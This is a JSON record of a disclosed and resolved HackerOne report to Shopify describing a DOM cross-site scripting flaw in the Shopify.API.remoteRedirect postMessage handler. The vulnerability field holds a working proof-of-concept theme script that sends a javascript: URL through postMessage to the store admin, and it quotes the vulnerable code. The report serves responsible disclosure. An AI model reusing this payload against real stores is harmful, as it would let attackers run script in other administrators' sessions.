{
  "id": 576532,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NzY1MzI=",
  "url": "https://hackerone.com/reports/576532",
  "title": "DOM XSS via Shopify.API.remoteRedirect",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2019-05-10T15:05:16.793Z",
  "submitted_at": "2019-05-10T15:05:16.793Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "yxw21",
    "url": "/yxw21",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-06-05T23:24:37.469Z",
  "bug_reporter_agreed_on_going_public_at": "2019-06-05T23:24:37.351Z",
  "team_member_agreed_on_going_public_at": "2019-06-05T19:54:40.982Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "hi, team, after I read the report #422043, I found another monitor postmessage, and did not correctly verify the origin, leading to dom xss, using the store theme can write js this feature, we can modify a theme for the following Payload, \n```\n<script>\n  function attack(){\n  \tvar ctx=window.open('https://cuxuri.myshopify.com/admin/themes');\n    var interval;\n    interval=setInterval(function(){\n      if(window.attackSuccess){\n        clearInterval(interval);\n      }else{\n        ctx.postMessage(`{\"message\":\"Shopify.API.remoteRedirect\",\"data\":{\"location\":\"javascript:alert(document.domain)\"}}`);\n      }\n    },500);;\n  }\n</script>\n<a href=\"javascript:attack()\" style=\"display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;\">click me start attack</a>\n```\nthen log in to the store, access the page containing the payload, you can trigger xss, \nsuch as:\n\n{F487966}\n\nProblem code:\n```\nhttps://cdn.shopifycloud.com/web/assets/latest/embeddedApp-ab64a8a13eb3f06403cb2acf67e20576a144bf2d3625807923872e8adf469a14.js\ncase de.RemoteRedirect:\n                            this.handleRemoteRedirect(t.location);\n                            break;\n```\n\n## Impact\n\nAttack other administrators",
  "weakness": {
    "id": 63,
    "name": "Cross-site Scripting (XSS) - DOM"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 487966,
      "file_name": "1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/966/991506843fc85cc8b5491bcb19496e210106170c/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ63C5JMFQ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T152605Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFDvRHn9ky1YQHzGuakS4Iz0vDtMnYWimh35oKHC7r%2F2AiAia3verAavWozpj%2BAPj1Qc2tpTLeRgJgInw7s8k0Ms7CqyBQgWEAMaDDAxMzYxOTI3NDg0OSIMRvcecFwXg0wZuwgGKo8FksKPXngK9ceXhWE613mjXnbZdBITFJXG%2B7ytn5mQqEzLPXaN8Dx%2F8nIueq6O5yT55A9X2c24%2FKOSrqpojCWB%2FmHExscAysLYKTPUIlVMYMErXfxTvQFibbmyznBSpJpT6mph1%2FC7m4PzL0Z7s5mDS2e2w0q67hMvtblmSd6z2S5sLLprqEv4nxaO2Z03eCVZed4HflAJpQWGkIN9dxrJmqL0xfNinTwvuGKS%2FtQXpUBCwbAlEPsVf6kFzMuBkc0qEZZXmFUVur2bm0BmaPy5U0SS0%2F0oEWM%2B%2Fd1IyjwDODtmd9pVA%2B1zdR2zU3SBpqjUGbCVyxM%2BCvCJKx2laInTTGrcZXpxB0ZaBPc72qXRyrFiYVUpxGbqbXqPTdJjGm8GxvuwY6dwYyqiDL0L4ZHA8ueYS34pZlSvE5cvZ%2B5L0JHJa9vEJ1W8Pqt1wxWRFxk9rTjKEsTldCLOAaZQArrL09XbORY9RKJymViUcVKXXDZyYrihG24puBP7Q0klt33FfXCOWl8D%2BdEqzwPIv5H2VZGi4m%2FGS4Id8QNSv7KNd72oaaqqBHPe%2BcaQBNdrl5tGj0GLQa5vEwuuFiqiZfYWS1JXRedJdO1231Hq5yU66xdMa6GLuVKIVsSg5Tz7a0KFhpvLGYG28NsHgim3jEPzU0%2FfskoJ43K0M%2FAQW57Qfto%2F4xPT%2Faem36dXOyY929FDEawLfAQW2K1c5SH1oiT%2Bomp7b0v3iKTxB5YbVOX1QIaqPITE64vVve%2FQVHigwZjXn6gm8r3%2B5jIuQXaMTKmt3Z8qZAXuvHXyIhFySvgvVd1HaBdX%2FLAo6wYx%2BaWuJl8Y7Qg7uuXGEMEBkIba7kqCgJ4cUzEvkb5%2BaF0h0rxabTD357%2FGBjqyAfqYzux0u2fIPi%2F%2B5WgXrdOTFF9hswACvH1kqzOXf9i%2FhFaA9reIVKxbcUQk7RHelMKqGaiuR4%2BORktmbLN6VadvA%2BPEkXFVVes%2B7LnvM9NmvFVdF2yG8LnQmcQMm%2Fue0xNqf3zd753V6T9g2UU8jFT%2F5oJbh4z7d9HvcXbDlcr4DTGGjwHTE7klqn8N7UXcU3Q4yrkD3foXSV43foaRVQywlCTelvhv%2FMKxvOToYrdap2M%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=56b2ea33725e7852790024aa68608b0f5a86008a4480a65607a36463d1e7d65c",
      "file_size": 201924,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 16,
  "voters": [
    "drsniper",
    "jin0ne",
    "ali",
    "0xsheet",
    "asad0x01_",
    "tungpun",
    "decoy",
    "cryptographer",
    "tiago-danin",
    "0xm1racle",
    "and 6 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 413,
    "asset_type": "URL",
    "asset_identifier": "your-store.myshopify.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
